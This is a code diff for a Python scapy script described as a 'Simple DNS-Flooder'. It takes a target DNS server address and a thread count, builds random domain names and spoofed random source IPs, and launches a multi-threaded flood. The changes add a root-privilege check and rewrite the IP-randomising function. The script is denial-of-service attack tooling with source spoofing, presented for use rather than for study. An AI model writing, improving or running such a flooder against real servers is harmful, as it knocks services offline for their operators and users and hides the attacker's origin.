@@ -2,13 +2,18 @@
 
 from scapy.all import *
 from time import sleep
-import random
+from sys import exit as sysexit
 import string
+import random
 import threading
-import argparse
+from argparse import ArgumentParser
+
+# check for root
+if not os.geteuid() == 0:
+    sysexit("\nOnly root can run this script\n")
 
 # init option parser
-parser = argparse.ArgumentParser(description='Simple DNS-Flooder')
+parser = ArgumentParser(description='Simple DNS-Flooder')
 parser.add_argument("-s", "--server", help='DNS-Server IP Address', required=True)
 parser.add_argument("-t", "--threads", type=int, help='Threads to use', required=True)
 args = parser.parse_args()
@@ -25,8 +30,11 @@ def get_rand_domain():
 
 # randomized IP
 def get_random_IP():
-    genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
-    return genIP
+    genIP = ""
+    for i in range(0, 4):
+        part = str(random.randint(1,254))
+        genIP += part + "."
+    return genIP[:-1]
 
 # flood
 def flood(): 
@@ -48,8 +56,6 @@ def start_threads():
 
 # start here
 if __name__ == "__main__":
-    print("RUN AS ROOT!")
-    sleep(2)
     print(f"Starting Flood of {args.server} with {args.threads} Threads in 3 seconds ...")
     sleep(3)
     start_threads()
